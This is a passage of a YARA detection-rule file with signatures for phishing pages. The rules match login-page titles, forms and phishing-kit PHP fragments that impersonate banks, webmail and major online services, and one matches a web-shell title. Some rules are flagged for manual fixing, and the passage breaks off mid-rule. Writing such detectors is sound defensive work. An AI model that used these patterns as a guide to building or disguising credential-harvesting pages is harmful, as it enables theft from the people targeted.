rule html_phishing_generic_050 : phishing
{
    strings:
        $trigger = "<HTML"
    condition:
        $trigger and PR00412
}

rule html_phishing_generic_051 : phishing
{
    strings:
        $trigger = "<title>Other Email Provider"
    condition:
        $trigger
}

private rule PR00413 : trigger
{
    strings:
        $ps0 = "<title>Navy Federal Credit Union"
    condition:
        $ps0
}

rule html_phishing_generic_052 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00413
}

private rule PR00414 : trigger
{
    strings:
        $ps0 = "lease enter your correct Social Security Number"
    condition:
        $ps0
}

rule html_phishing_generic_053 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00414
}

private rule PR00415 : trigger
{
    strings:
        $ps0 = "Log in to Internet Banking</title>"
    condition:
        $ps0
}

rule html_phishing_generic_054 : phishing
{
    strings:
        $trigger = "Online"
    condition:
        $trigger and PR00415
}

// MANUAL FIX NECESSARY
rule html_phishing_generic_055 : phishing
{
    strings:
        $trigger = "<title"
        $html_phishing_generic_055_r0 = /<title>\s*Online\s*([Vv]erify|[Vv]erification|[Bb]anking)\s*[(\-\s*\.\:\w+)]+Online\s*([Vv]erify|[Vv]erification|[Bb]anking)\s*<\/title>/
    condition:
        $trigger and $html_phishing_generic_055_r0
}

rule html_phishing_generic_057 : phishing
{
    strings:
        $trigger = "<title>Match.com:"
    condition:
        $trigger
}

rule html_phishing_generic_058 : phishing
{
    strings:
        $trigger = "<title>AT&amp;T - Login</title>"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule html_phishing_generic_059 : phishing
{
    strings:
        $trigger = "<title"
        $html_phishing_generic_059_r0 = /([Bb]ank of [Aa]merica|[Cc]hase|[Ww]ells [Ff]argo|[Bb]anco|RBC|e[Bb]ay|[Pp]ay[Pp]al|[Ss]antander|[Yy]ahoo!?|[Ii][Tt]unes|[Gg]mail|[Dd]rop[Bb]ox)\s*[Aa]ccount\s*[Vv]erificatio[^<]+<.title>/
    condition:
        $trigger and $html_phishing_generic_059_r0
}

// MANUAL FIX NECESSARY
rule html_phishing_generic_060 : phishing
{
    strings:
        $trigger = "Online"
        $html_phishing_generic_060_r0 = /<title>\s*[Oo]nline\s*[Bb]anking\s*[Ss]ervices\s*<\/title>/
    condition:
        $trigger and PR00353 and $html_phishing_generic_060_r0
}

rule html_phishing_generic_060_02 : phishing
{
    strings:
        $trigger = "<script>document.write(\"Online Banking"
    condition:
        $trigger
}

private rule PR00416 : trigger
{
    strings:
        $ps0 = "<title>Account verification</title>"
    condition:
        $ps0
}

rule html_phishing_generic_061 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00281 and PR00416
}

private rule PR00417 : trigger
{
    strings:
        $ps0 = "<title>Verifying Logon</title>"
    condition:
        $ps0
}

rule html_phishing_generic_062 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00417
}

rule html_phishing_generic_063 : phishing
{
    strings:
        $trigger = "<title>Email Verified</title>"
    condition:
        $trigger and PR00312
}

rule html_phishing_generic_064 : phishing
{
    strings:
        $trigger = "3c%74%69%74%6c%65%3e%53%69%67%6e%20%69%6e%20%74%6f%20%79%6f%75%72%20%61%63%63%6f%75%6e%74%3c%2f%74%69%74%6c%65%3e"
    condition:
        $trigger and PR00231
}

private rule PR00418 : trigger
{
    strings:
        $ps0 = ">To help keep you safe, we required an extra security challenge. You will need to verify your"
    condition:
        $ps0
}

rule html_phishing_generic_065 : phishing
{
    strings:
        $trigger = "<HTML"
    condition:
        $trigger and PR00418
}

private rule PR00419 : trigger
{
    strings:
        $ps0 = ">Authentification</"
    condition:
        $ps0
}

rule html_phishing_generic_066 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00419
}

rule html_phishing_generic_067 : phishing
{
    strings:
        $trigger = ">Personal Informations</title>"
    condition:
        $trigger and PR00042 and PR00281
}

rule html_phishing_generic_068 : phishing
{
    strings:
        $trigger = "<title>&#83;&#105;&#103;&#110;&#32;&#73;&#110;</title>"
    condition:
        $trigger
}

rule html_phishing_generic_069 : phishing
{
    strings:
        $trigger = ">Confirm your account<"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_070 : phishing
{
    strings:
        $trigger = "<title>Autentisering</title>"
    condition:
        $trigger
}

rule html_phishing_generic_071 : phishing
{
    strings:
        $trigger = "<!-- Mirrored from canada-revenue-agency.canada.refund.qc.powercurrency"
    condition:
        $trigger and PR00042
}

private rule PR00420 : trigger
{
    strings:
        $ps0 = "<title>Try Again!"
    condition:
        $ps0
}

rule html_phishing_generic_072 : phishing
{
    strings:
        $trigger = "<meta http-equiv=\"REFRESH\" content="
    condition:
        $trigger and PR00420
}

rule html_phishing_generic_073 : phishing
{
    strings:
        $trigger = "method=\"post\" id=\"demo-form\" action=\"act.php\">"
    condition:
        $trigger and PR00042
}

private rule PR00421 : trigger
{
    strings:
        $ps0 = "; url=http://www.alpha-index.co.uk/"
    condition:
        $ps0
}

rule html_phishing_generic_074 : phishing
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content="
    condition:
        $trigger and PR00421 and PR00247
}

rule html_phishing_generic_075 : phishing
{
    strings:
        $trigger = "<title>Soci\xc3\xa9t\xc3\xa9 G\xc3\xa9n\xc3\xa9rale |"
    condition:
        $trigger and PR00312
}

rule html_phishing_generic_076 : phishing
{
    strings:
        $trigger = "title%3EAccount%20Security%20Settins%3C"
    condition:
        $trigger and PR00231
}

private rule PR00422 : trigger
{
    strings:
        $ps0 = ".btn1{ background:url(http://www.eyou.com/tpl/user/tpl1/images/"
    condition:
        $ps0
}

rule html_phishing_generic_077 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00422
}

private rule PR00423 : trigger
{
    strings:
        $ps0 = "document.querySelector"
    condition:
        $ps0
}

rule html_phishing_generic_078 : phishing
{
    strings:
        $trigger = "/offers/done.php\" id=\"frm\" name=\"frm\" class="
    condition:
        $trigger and PR00423
}

rule html_phishing_generic_079 : phishing
{
    strings:
        $trigger = "<title>Nedbank Money"
    condition:
        $trigger
}

private rule PR00424 : trigger
{
    strings:
        $ps0 = "MegaMass Evil"
    condition:
        $ps0
}

rule html_phishing_generic_080 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00424
}

rule html_phishing_generic_082 : phishing
{
    strings:
        $trigger = ">Connection to Secure Email Server In Progress..."
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_083 : phishing
{
    strings:
        $trigger = ">Recover Account<"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_084 : phishing
{
    strings:
        $trigger = ">GMX-Anmelden<"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_085 : phishing
{
    strings:
        $trigger = ">Help us protect your account<"
    condition:
        $trigger and PR00042
}

private rule PR00425 : trigger
{
    strings:
        $ps0 = "digipass"
    condition:
        $ps0
}

private rule PR00426 : trigger
{
    strings:
        $ps0 = "2015-2016 Argenta"
    condition:
        $ps0
}

rule html_phishing_generic_086 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00425 and PR00426
}

private rule PR00427 : trigger
{
    strings:
        $ps0 = "BNP Paribas Fortis"
    condition:
        $ps0
}

rule html_phishing_generic_087 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00425 and PR00427
}

rule html_phishing_generic_088 : phishing
{
    strings:
        $trigger = "%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%32%30%30%22%20%62%67%63%6f%6c"
    condition:
        $trigger and PR00231
}

rule html_phishing_generic_089 : phishing
{
    strings:
        $trigger = "STRATO Kunden-Login"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_090 : phishing
{
    strings:
        $trigger = "&#51060;&#47700;&#51068; &#50629;&#44536;&#47112;&#51060;&#46300;"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_091 : phishing
{
    strings:
        $trigger = "&#44228;&#51221; &#48372;&#50504; &#49444;&#51221;"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_092 : phishing
{
    strings:
        $trigger = "NTNU Webmail"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_093 : phishing
{
    strings:
        $trigger = ">Verify Computer For"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_094 : phishing
{
    strings:
        $trigger = "Online Banking Login"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_095 : phishing
{
    strings:
        $trigger = "<title>Secure |"
    condition:
        $trigger
}

private rule PR00428 : trigger
{
    strings:
        $ps0 = "<title>YouTube"
    condition:
        $ps0
}

rule html_phishing_generic_096 : phishing
{
    strings:
        $trigger = "Google wants to make sure"
    condition:
        $trigger and PR00428 and PR00312
}

rule html_phishing_generic_097 : phishing
{
    strings:
        $trigger = "<title>\xe1\x8f\xa4\xd0\xb5ri\xc6\x92y \xce\xa5\xd0\xbe\xcf\x85r \xc6\x96d\xd0\xb5ntity"
    condition:
        $trigger
}

rule html_phishing_generic_098 : phishing
{
    strings:
        $trigger = "<title>\xe1\x8f\x9e\xd0\xbegin - \xd4\x9c\xd0\xb0ll\xd0\xb5t"
    condition:
        $trigger
}

rule html_phishing_generic_099 : phishing
{
    strings:
        $trigger = "<title>\xe1\x8e\xa1\xd0\xb5\xcf\xb2\xd0\xbe\xce\xbd\xd0\xb5r \xcf\x9c\xcf\x85nds"
    condition:
        $trigger
}

private rule PR00429 : trigger
{
    strings:
        $ps0 = "<title>Secured Doc Page</title>"
    condition:
        $ps0
}

rule html_phishing_generic_100 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00429
}

private rule PR00430 : trigger
{
    strings:
        $ps0 = "explode('@', $email);"
    condition:
        $ps0
}

rule html_phishing_generic_100_02 : phishing
{
    strings:
        $trigger = "eader('Location: "
    condition:
        $trigger and PR00430
}

private rule PR00431 : trigger
{
    strings:
        $ps0 = "header("
    condition:
        $ps0
}

private rule PR00432 : trigger
{
    strings:
        $ps0 = "?rand="
    condition:
        $ps0
}

rule html_phishing_generic_100_03 : phishing
{
    strings:
        $trigger = "substr(strrchr($email, \"@\"), 1);"
    condition:
        $trigger and PR00431 and PR00432
}

private rule PR00433 : trigger
{
    strings:
        $ps0 = "<title>... Session Expired</title>"
    condition:
        $ps0
}

rule html_phishing_generic_101 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00433
}

rule html_phishing_generic_102 : phishing
{
    strings:
        $trigger = "| Login | The Leading</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_103 : phishing
{
    strings:
        $trigger = "<title>Encrypted File</title>"
    condition:
        $trigger and PR00281
}

rule html_phishing_generic_104 : phishing
{
    strings:
        $trigger = "<title>Connexion \xc3\xa0 votre Espace Client"
    condition:
        $trigger
}

rule html_phishing_generic_105 : phishing
{
    strings:
        $trigger = "<title>Fortnite Battle Royal - Hack Generator</title>"
    condition:
        $trigger
}

rule html_phishing_generic_106 : phishing
{
    strings:
        $trigger = "<title>CryptoTracker"
    condition:
        $trigger
}

rule html_phishing_generic_106_02 : phishing
{
    strings:
        $trigger = "<title>CryptoLog"
    condition:
        $trigger
}

rule html_phishing_generic_107 : phishing
{
    strings:
        $trigger = "<title>Ace Ventura slot online"
    condition:
        $trigger
}

rule html_phishing_generic_108 : phishing
{
    strings:
        $trigger = "<title>Telekom Login</title>"
    condition:
        $trigger
}

rule html_phishing_generic_109 : phishing
{
    strings:
        $trigger = "<title>CONTROLE 2.0</title>"
    condition:
        $trigger
}

rule html_phishing_generic_110 : phishing
{
    strings:
        $trigger = "<title>GOOD LUCK 2020 </title>"
    condition:
        $trigger
}

rule html_phishing_generic_111 : phishing
{
    strings:
        $trigger = "<title>Para empresas"
    condition:
        $trigger
}

rule html_phishing_generic_111_02 : phishing
{
    strings:
        $trigger = "<title>Para Empresas</title>"
    condition:
        $trigger
}

private rule PR00434 : trigger
{
    strings:
        $ps0 = ">Please wait, you are now being redirected to BPI Online page<"
    condition:
        $ps0
}

rule html_phishing_generic_112 : phishing
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\""
    condition:
        $trigger and PR00434
}

rule html_phishing_generic_113 : phishing
{
    strings:
        $trigger = "Self-Employment Income Support Scheme - GOV.UK</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_114 : phishing
{
    strings:
        $trigger = "<title>Sign in  QQMail"
    condition:
        $trigger
}

rule html_phishing_generic_115 : phishing
{
    strings:
        $trigger = "Service e Carte bleue</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_116 : phishing
{
    strings:
        $trigger = "<title>Redsys</title>"
    condition:
        $trigger
}

private rule PR00435 : trigger
{
    strings:
        $ps0 = "file_put_contents"
    condition:
        $ps0
}

rule html_phishing_generic_117 : phishing
{
    strings:
        $trigger = "CREDIT DU NORD///"
    condition:
        $trigger and PR00435
}

rule html_phishing_generic_117_02 : phishing
{
    strings:
        $trigger = "<title>VERIFICATIONS</title>"
    condition:
        $trigger
}

private rule PR00436 : trigger
{
    strings:
        $ps0 = "\"THANATOS LA FOUDRE"
    condition:
        $ps0
}

rule html_phishing_generic_117_03 : phishing
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR00436 and PR00301
}

rule html_phishing_generic_117_04 : phishing
{
    strings:
        $trigger = "<title>Authentification - Cr\xc3\xa9dit du Nord"
    condition:
        $trigger
}

rule html_phishing_generic_117_05 : phishing
{
    strings:
        $trigger = "credit du nord///"
    condition:
        $trigger and PR00435
}

rule html_phishing_generic_118 : phishing
{
    strings:
        $trigger = "Inloggen - Mijn ICS |"
    condition:
        $trigger and PR00042 and PR00281
}

rule html_phishing_generic_119 : phishing
{
    strings:
        $trigger = "title>www.sparkasse"
    condition:
        $trigger and PR00042 and PR00046
}

rule html_phishing_generic_120 : phishing
{
    strings:
        $trigger = "<title>Libero:"
    condition:
        $trigger
}

private rule PR00437 : trigger
{
    strings:
        $ps0 = "header"
    condition:
        $ps0
}

private rule PR00438 : trigger
{
    strings:
        $ps0 = " = \"From: libero <"
    condition:
        $ps0
}

rule html_phishing_generic_120_02 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR00438
}

private rule PR00439 : trigger
{
    strings:
        $ps0 = ">\xd0\x9f\xd1\x80\xd0\xbe\xd0\xb2\xd0\xb5\xd1\x80\xd1\x8c\xd1\x82\xd0\xb5 \xd1\x81\xd1\x83\xd0\xbc\xd0\xbc\xd1\x83 \xd0\xbf\xd0\xbe\xd0\xbb\xd0\xbe\xd0\xb6\xd0\xb5\xd0\xbd\xd0\xbd\xd0\xbe\xd0\xb9 \xd0\x92\xd0\xb0\xd0\xbc \xd0\xb2\xd1\x8b\xd0\xbf\xd0\xbb\xd0\xb0\xd1\x82\xd1\x8b<"
    condition:
        $ps0
}

rule html_phishing_generic_121 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00439 and PR00046
}

rule html_phishing_generic_122 : phishing
{
    strings:
        $trigger = "<title>BuildaPCSales, Reddit BuildaPCSales,"
    condition:
        $trigger
}

rule html_phishing_generic_123 : phishing
{
    strings:
        $trigger = "<title>Clever Login, Clever Student Login,"
    condition:
        $trigger
}

rule html_phishing_generic_124 : phishing
{
    strings:
        $trigger = "<title>CrackStreams - NFL, MLB, UFC, MMA, NBA Free Streaming"
    condition:
        $trigger
}

rule html_phishing_generic_125 : phishing
{
    strings:
        $trigger = "<title>MangaGo, MangaGo Yaoi"
    condition:
        $trigger
}

rule html_phishing_generic_126 : phishing
{
    strings:
        $trigger = "<title>Unemployment Login, NYS Unemployment Login,"
    condition:
        $trigger
}

rule html_phishing_generic_127 : phishing
{
    strings:
        $trigger = "<title>WhatLeaks, WhatLeaks IP & VPN Checker"
    condition:
        $trigger
}

rule html_phishing_generic_128 : phishing
{
    strings:
        $trigger = "<title>Offres Mobile | SAPO"
    condition:
        $trigger
}

private rule PR00440 : trigger
{
    strings:
        $ps0 = "bitcoin"
    condition:
        $ps0
}

rule html_phishing_generic_129 : phishing
{
    strings:
        $trigger = "/ Cryptocurrency tumbler</a></p>"
    condition:
        $trigger and PR00042 and PR00440
}

rule html_phishing_gmail_001 : phishing
{
    strings:
        $trigger = "<title>GMAIL SIGN IN"
    condition:
        $trigger
}

rule html_phishing_gmail_001_02 : phishing
{
    strings:
        $trigger = "<title>GMAlL SIGN IN"
    condition:
        $trigger
}

rule html_phishing_gmail_002 : phishing
{
    strings:
        $trigger = "<title>Gmail Sign"
    condition:
        $trigger
}

rule html_phishing_gmail_003 : phishing
{
    strings:
        $trigger = "<title>&#71;&#109;&#97;&#105;&#108;"
    condition:
        $trigger
}

rule html_phishing_gmail_004 : phishing
{
    strings:
        $trigger = "<title>Gmail Login - www.Gmail.com - Gmail Sign in Account"
    condition:
        $trigger
}

private rule PR00441 : trigger
{
    strings:
        $ps0 = "<title>Sign In</title>"
    condition:
        $ps0
}

private rule PR00442 : trigger
{
    strings:
        $ps0 = "godaddy.com/\"><img src=\"data:image;base64,iVBORw0KGgoAAAANSUhEUgAAAOAAAABSCAMAAAB6"
    condition:
        $ps0
}

rule html_phishing_godaddy_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00441 and PR00442
}

private rule PR00443 : trigger
{
    strings:
        $ps0 = "GoDaddy"
    condition:
        $ps0
}

rule html_phishing_godaddy_002 : phishing
{
    strings:
        $trigger = "<title>LOG IN"
    condition:
        $trigger and PR00281 and PR00443
}

rule html_phishing_godaddy_003 : phishing
{
    strings:
        $trigger = "#login-panel #form-header #godaddy-template {"
    condition:
        $trigger and PR00042
}

rule html_phishing_google_accounts_001 : phishing
{
    strings:
        $trigger = "<title>Google Accounts</title>"
    condition:
        $trigger
}

rule html_phishing_google_accounts_002 : phishing
{
    strings:
        $trigger = "<title>Verify your - Google Accounts</title>"
    condition:
        $trigger
}

rule html_phishing_google_accounts_003 : phishing
{
    strings:
        $trigger = "<title>Sign in - Google Accounts</title>"
    condition:
        $trigger
}

rule html_phishing_google_accounts_004 : phishing
{
    strings:
        $trigger = "<title>Security Credentials Identification - Google Accounts</title>"
    condition:
        $trigger
}

rule html_phishing_google_accounts_006 : phishing
{
    strings:
        $trigger = "<title>Gmail Verification"
    condition:
        $trigger
}

private rule PR00444 : trigger
{
    strings:
        $ps0 = "Google"
    condition:
        $ps0
}

private rule PR00445 : trigger
{
    strings:
        $ps0 = "<title>Sign-in to Continue"
    condition:
        $ps0
}

rule html_phishing_google_accounts_007 : phishing
{
    strings:
        $trigger = "Sign in to continue to Gmail"
    condition:
        $trigger and PR00444 and PR00445
}

rule html_phishing_google_accounts_008 : phishing
{
    strings:
        $trigger = "CheckConnectionTempCookie\"+String(Math.floor(1E"
    condition:
        $trigger and PR00371 and PR00050
}

private rule PR00446 : trigger
{
    strings:
        $ps0 = "zLy9Hb29nbGVfZG9jc19maWxlcy9zdHlsZTIuY3NzIiByZ"
    condition:
        $ps0
}

rule html_phishing_google_accounts_009 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00446
}

rule html_phishing_google_accounts_010 : phishing
{
    strings:
        $trigger = "<title>G-Mail Verification"
    condition:
        $trigger
}

rule html_phishing_google_accounts_011 : phishing
{
    strings:
        $trigger = "<title>Google</title>"
    condition:
        $trigger
}

rule html_phishing_googledocs_001 : phishing
{
    strings:
        $trigger = "<title>Googledocs Secure</title>"
    condition:
        $trigger
}

rule html_phishing_googledocs_002 : phishing
{
    strings:
        $trigger = "<title>Google Docs - Online documents, spreadsheets, presentations, "
    condition:
        $trigger
}

private rule PR00447 : trigger
{
    strings:
        $ps0 = "action=\"other.php\" id=\"gaia_loginform\""
    condition:
        $ps0
}

rule html_phishing_googledocs_003 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00447
}

private rule PR00448 : trigger
{
    strings:
        $ps0 = "Google Drive - Google Docs"
    condition:
        $ps0
}

rule html_phishing_googledocs_004 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00448
}

rule html_phishing_googledocs_005 : phishing
{
    strings:
        $trigger = "<link rel=\"shortcut icon\" href=\"images/liamg.ico\">"
    condition:
        $trigger and PR00050
}

rule html_phishing_googledocs_006 : phishing
{
    strings:
        $trigger = "%3C%74%69%74%6C%65%3E%47%6F%6F%67%6C%65%20%44%6F%63%73"
    condition:
        $trigger and PR00231
}

rule html_phishing_googledocs_007 : phishing
{
    strings:
        $trigger = "<title>Google Drive - Online documents"
    condition:
        $trigger
}

rule html_phishing_googledocs_008 : phishing
{
    strings:
        $trigger = "window.location.href=\"http://docs.google.com/\";"
    condition:
        $trigger and PR00301
}

private rule PR00449 : trigger
{
    strings:
        $ps0 = "<title>Google | Drive"
    condition:
        $ps0
}

rule html_phishing_googledrive_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00449
}

private rule PR00450 : trigger
{
    strings:
        $ps0 = "<title>Google Drive"
    condition:
        $ps0
}

rule html_phishing_googledrive_002 : phishing
{
    strings:
        $trigger = "==></frame>"
    condition:
        $trigger and PR00450 and PR00247
}

rule html_phishing_googledrive_003 : phishing
{
    strings:
        $trigger = "Google Drive</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_gov_france_001 : phishing
{
    strings:
        $trigger = "style=\"background-image: url(https://cfspart.impots.gouv.fr/"
    condition:
        $trigger and PR00042
}

private rule PR00451 : trigger
{
    strings:
        $ps0 = "personal_loans_halifax"
    condition:
        $ps0
}

rule html_phishing_halifax_001 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00451
}

rule html_phishing_hong_leong_001 : phishing
{
    strings:
        $trigger = "Welcome To Hong Leong Bank"
    condition:
        $trigger
}

rule html_phishing_hotmail_001 : phishing
{
    strings:
        $trigger = "<title>Hotmail Verification</title>"
    condition:
        $trigger
}

rule html_phishing_hotmail_003 : phishing
{
    strings:
        $trigger = "class=\"cssSignupText\">Don't have a Hotmail account?"
    condition:
        $trigger and PR00080
}

rule html_phishing_hotmail_004 : phishing
{
    strings:
        $trigger = "\" href=\"https://login.live.com/resetpw.srf?wreply=https://login.live.com/login.srf"
    condition:
        $trigger
}

rule html_phishing_hotmail_005 : phishing
{
    strings:
        $trigger = " Microsoft</span><a href=\"#\" id=\"ftrTerms\">Terms</a><a href=\"#\""
    condition:
        $trigger and PR00042
}

private rule PR00452 : trigger
{
    strings:
        $ps0 = "=\"TextSemiBold\">Sign up now</a></div></div><div id=\"SignUpTD\""
    condition:
        $ps0
}

rule html_phishing_hotmail_006 : phishing
{
    strings:
        $trigger = "Microsoft"
    condition:
        $trigger and PR00042 and PR00452
}

private rule PR00453 : trigger
{
    strings:
        $ps0 = "urlPost:'connectID.php'"
    condition:
        $ps0
}

rule html_phishing_hotmail_007 : phishing
{
    strings:
        $trigger = "Microsoft"
    condition:
        $trigger and PR00042 and PR00453
}

private rule PR00454 : trigger
{
    strings:
        $ps0 = "form action=\"login.php\" method=\"POST\" name=\"logonForm\""
    condition:
        $ps0
}

rule html_phishing_hotmail_008 : phishing
{
    strings:
        $trigger = "Microsoft"
    condition:
        $trigger and PR00042 and PR00454
}

private rule PR00455 : trigger
{
    strings:
        $ps0 = "signUpUrl: signUpUrl, resetPasswordUrl: resetPasswordUrl"
    condition:
        $ps0
}

rule html_phishing_hotmail_009 : phishing
{
    strings:
        $trigger = "Microsoft"
    condition:
        $trigger and PR00042 and PR00455
}

rule html_phishing_hotmail_010 : phishing
{
    strings:
        $trigger = "src=\"./Sign in to your Microsoft account"
    condition:
        $trigger and PR00042
}

rule html_phishing_hotmail_011 : phishing
{
    strings:
        $trigger = "<span style=\"font-family:&#39;office365icons&#39;;color:transparent;\">A</span>"
    condition:
        $trigger and PR00267 and PR00050
}

rule html_phishing_hotmail_012 : phishing
{
    strings:
        $trigger = "We detected something unusual about a recent sign-in to the Microsoft account"
    condition:
        $trigger and PR00042
}

rule html_phishing_hotmail_013 : phishing
{
    strings:
        $trigger = "<title>Hotmail -"
    condition:
        $trigger
}

rule html_phishing_huntington_001 : phishing
{
    strings:
        $trigger = "<title>Huntington - Online Banking, Checking"
    condition:
        $trigger
}

rule html_phishing_huntington_002 : phishing
{
    strings:
        $trigger = "mainBody_lblTitle\">Huntington Online Banking - "
    condition:
        $trigger
}

private rule PR00456 : trigger
{
    strings:
        $ps0 = "<title>Access My Customer Space</title>"
    condition:
        $ps0
}

rule html_phishing_hydroquebec_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00281 and PR00456
}

rule html_phishing_hydroquebec_002 : phishing
{
    strings:
        $trigger = "<title>Update My Billing lnformation</title>"
    condition:
        $trigger
}

private rule PR00457 : trigger
{
    strings:
        $ps0 = "Hydro Qu\xc3\xa9bec</span>"
    condition:
        $ps0
}

rule html_phishing_hydroquebec_003 : phishing
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content="
    condition:
        $trigger and PR00457 and PR00247
}

rule html_phishing_hydroquebec_004 : phishing
{
    strings:
        $trigger = "You are in a secure server by Hydro Qu\xc3\xa9bec"
    condition:
        $trigger and PR00042
}

rule html_phishing_ICICI_001 : phishing
{
    strings:
        $trigger = "<title>ICICI Bank - Email Authentication</title>"
    condition:
        $trigger and PR00247
}

rule html_phishing_indoxploit_001 : phishing
{
    strings:
        $trigger = "<title>IndoXploit"
    condition:
        $trigger
}

rule html_phishing_instagram_001 : phishing
{
    strings:
        $trigger = "<title>Login \xe2\x80\xa2 Instagram"
    condition:
        $trigger
}

rule html_phishing_INTERAC_001 : phishing
{
    strings:
        $trigger = "<title>Get INTERAC e-Transfer Online Form<"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule html_phishing_keybank_001 : phishing
{
    strings:
        $trigger = "Bank"
        $html_phishing_keybank_001_r0 = /<title>[K-k]ey[B-b]ank/
    condition:
        $trigger and $html_phishing_keybank_001_r0
}

rule html_phishing_lcl_001 : phishing
{
    strings:
        $trigger = "<title>LCL - Le Cr\xc3\xa9dit Lyonnais</title>"
    condition:
        $trigger and PR00281
}

rule html_phishing_linkedin_001 : phishing
{
    strings:
        $trigger = "<title>Sign In | LinkedIn"
    condition:
        $trigger
}

private rule PR00458 : trigger
{
    strings:
        $ps0 = "<title>Sign In to LinkedIn"
    condition:
        $ps0
}

rule html_phishing_linkedin_002 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00458
}

rule html_phishing_linkedin_003 : phishing
{
    strings:
        $trigger = "<title>LinkedIn Login"
    condition:
        $trigger
}

rule html_phishing_linkedin_004 : phishing
{
    strings:
        $trigger = "<title>Business | LinkedIn<"
    condition:
        $trigger
}

private rule PR00459 : trigger
{
    strings:
        $ps0 = "LinkedIn Corporation"
    condition:
        $ps0
}

rule html_phishing_linkedin_005 : phishing
{
    strings:
        $trigger = "licdn"
    condition:
        $trigger and PR00042 and PR00459
}

rule html_phishing_Lloyds_001 : phishing
{
    strings:
        $trigger = ">Lloyds TSB - Welcome to Internet Banking"
    condition:
        $trigger
}

rule html_phishing_Lloyds_002 : phishing
{
    strings:
        $trigger = "header( \"Location: http://www.lloydstsb.com"
    condition:
        $trigger
}

rule html_phishing_Lloyds_003 : phishing
{
    strings:
        $trigger = "-----lloyds-----"
    condition:
        $trigger and PR00301
}

private rule PR00460 : trigger
{
    strings:
        $ps0 = "method=\"post\" action=\"check.php\""
    condition:
        $ps0
}

rule html_phishing_logmein_001 : phishing
{
    strings:
        $trigger = "LogMeIn"
    condition:
        $trigger and PR00042 and PR00460
}

rule html_phishing_magento_001 : phishing
{
    strings:
        $trigger = "<title>Log into Magento"
    condition:
        $trigger
}

rule html_phishing_mail_ru_001 : phishing
{
    strings:
        $trigger = "mail.ru</span>"
    condition:
        $trigger and PR00042
}

private rule PR00461 : trigger
{
    strings:
        $ps0 = "e.mail.ru/password/restore"
    condition:
        $ps0
}

rule html_phishing_mail_ru_002 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00046 and PR00461
}

private rule PR00462 : trigger
{
    strings:
        $ps0 = "<title>MailBox | Renewal Portal</title>"
    condition:
        $ps0
}

rule html_phishing_mailbox_renewal_001 : phishing
{
    strings:
        $trigger = "<input name=\"formtext2\" placeholder=\"Password\" type=\"text\""
    condition:
        $trigger and PR00462
}

private rule PR00463 : trigger
{
    strings:
        $ps0 = "Surpreenda MasterCard | Cadastro"
    condition:
        $ps0
}

rule html_phishing_mastercard_003 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00463
}

private rule PR00464 : trigger
{
    strings:
        $ps0 = "https://onlinebanking.mandtbank.com/layouts/RetailStyle.css"
    condition:
        $ps0
}

rule html_phishing_matbank_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00464
}

rule html_phishing_matbank_001_001 : phishing
{
    strings:
        $trigger = "<TITLE>Welcome to M&T Online Banking</TITLE>"
    condition:
        $trigger
}

rule html_phishing_matbank_001_002 : phishing
{
    strings:
        $trigger = "<HTML"
    condition:
        $trigger and PR00464
}

rule html_phishing_match_001 : phishing
{
    strings:
        $trigger = "<p>&copy; Copyright 2012 Match.com, L.L.C."
    condition:
        $trigger and PR00042
}

private rule PR00465 : trigger
{
    strings:
        $ps0 = "=\"http://www.maybank2u.com.my/mbb_info/m2u/public/personalDetail04.do?"
    condition:
        $ps0
}

rule html_phishing_maybank2u_001 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00465
}

rule html_phishing_mbna_001 : phishing
{
    strings:
        $trigger = "<title>MBNA Online Card Services<"
    condition:
        $trigger
}

private rule PR00466 : trigger
{
    strings:
        $ps0 = "Microsoft - Secure Login"
    condition:
        $ps0
}

rule html_phishing_microsoft_001 : phishing
{
